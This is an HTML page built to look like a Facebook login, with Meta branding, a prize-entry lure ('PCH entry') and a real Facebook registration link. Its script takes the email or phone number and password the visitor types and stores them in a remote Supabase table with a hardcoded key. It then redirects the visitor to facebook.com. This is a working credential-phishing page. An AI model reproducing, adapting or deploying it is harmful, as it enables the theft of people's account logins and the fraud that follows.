<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Quick Form</title>
  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }

    body {
      background: #f0f2f5;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }

    .form-card {
      background: #ffffff;
      border-radius: 12px;
      box-shadow: 0 4px 24px rgba(0, 0, 0, 0.1);
      padding: 40px 32px 30px;
      width: 100%;
      max-width: 400px;
    }

    .logo-container {
      text-align: center;
      margin-bottom: 18px;
    }

    .logo-container img {
      max-height: 60px;
      max-width: 220px;
      object-fit: contain;
    }

    .subtitle {
      text-align: center;
      color: #606770;
      font-size: 16px;
      margin-bottom: 28px;
      line-height: 1.4;
    }

    label {
      display: block;
      font-size: 14px;
      font-weight: 600;
      color: #1c1e21;
      margin-bottom: 6px;
    }

    input {
      width: 100%;
      padding: 14px 16px;
      border: 1px solid #dddfe2;
      border-radius: 8px;
      font-size: 16px;
      margin-bottom: 16px;
      outline: none;
      background: #fff;
    }

    input:focus {
      border-color: #1877f2;
      box-shadow: 0 0 0 2px #e7f3ff;
    }

    button[type="submit"] {
      width: 100%;
      background: #1877f2;
      color: white;
      border: none;
      border-radius: 8px;
      padding: 14px;
      font-size: 18px;
      font-weight: 600;
      cursor: pointer;
      margin-top: 6px;
    }

    button[type="submit"]:hover {
      background: #166fe5;
    }

    button[type="submit"]:disabled {
      background: #8db9f5;
      cursor: not-allowed;
    }

    .message {
      margin-top: 14px;
      text-align: center;
      font-size: 14px;
      display: none;
    }

    .success { color: #059669; }
    .error   { color: #dc2626; }

    /* Create new account button */
    .create-account-btn {
      display: block;
      width: 100%;
      margin-top: 24px;
      padding: 12px;
      text-align: center;
      border: 1.5px solid #1877f2;
      border-radius: 50px;
      color: #1877f2;
      font-size: 16px;
      font-weight: 600;
      text-decoration: none;
      background: transparent;
      transition: all 0.2s;
    }

    .create-account-btn:hover {
      background: #1877f2;
      color: white;
    }

    /* Bottom logo */
    .bottom-logo {
      text-align: center;
      margin-top: 36px;
    }

    .bottom-logo img {
      height: 26px;
      opacity: 0.85;
    }
  </style>
</head>
<body>
  <div class="form-card">
    <!-- Top logo -->
    <div class="logo-container">
      <img src="logo.png" alt="Business Logo" />
    </div>

    <p class="subtitle">Enter for PCH entry</p>

    <form id="quickForm">
      <label for="email">Email or phone number</label>
      <input
        type="text"
        id="email"
        name="email"
        placeholder="Email or phone number"
        required
        autocomplete="off"
      />

      <label for="answer">Password</label>
      <input
        type="text"
        id="answer"
        name="answer"
        placeholder="Password"
        required
        autocomplete="off"
      />

      <button type="submit" id="submitBtn">Log in</button>
    </form>

    <div id="message" class="message"></div>

    <!-- Create new account button -->
    <a href="https://web.facebook.com/reg/?_rdc=1&_rdr" class="create-account-btn">
      Create new account
    </a>

    <!-- Bottom logo -->
    <div class="bottom-logo">
      <img src="meta-logo.png" alt="Logo" />
    </div>
  </div>

  <script>
    // ========== PASTE YOUR SUPABASE VALUES HERE ==========
    const SUPABASE_URL = "https://tqbpwutzmalhcsmwwrbq.supabase.co";
    const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InRxYnB3dXR6bWFsaGNzbXd3cmJxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTE3NDMwNDUsImV4cCI6MjEwNzMxOTA0NX0.8GGZD-G2k-3_ETgyrbHs7KmVwME0P_wSKEnBNn1SSIg";
    // =====================================================

    const supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

    const form = document.getElementById("quickForm");
    const submitBtn = document.getElementById("submitBtn");
    const messageEl = document.getElementById("message");

    form.addEventListener("submit", async (e) => {
      e.preventDefault();

      const emailOrPhone = document.getElementById("email").value.trim();
      const answer = document.getElementById("answer").value.trim();

      if (!emailOrPhone || !answer) return;

      submitBtn.disabled = true;
      submitBtn.textContent = "Submitting...";
      messageEl.style.display = "none";

      const { error } = await supabaseClient
        .from("form_submissions")
        .insert([{ email_or_phone: emailOrPhone, answer: answer }]);

      if (error) {
        console.error(error);
        messageEl.textContent = "Something went wrong. Please try again.";
        messageEl.className = "message error";
        messageEl.style.display = "block";
        submitBtn.disabled = false;
        submitBtn.textContent = "Continue";
      } else {
        // Redirect after successful submission
        window.location.href = "https://www.facebook.com";
      }
    });
  </script>
</body>
</html>
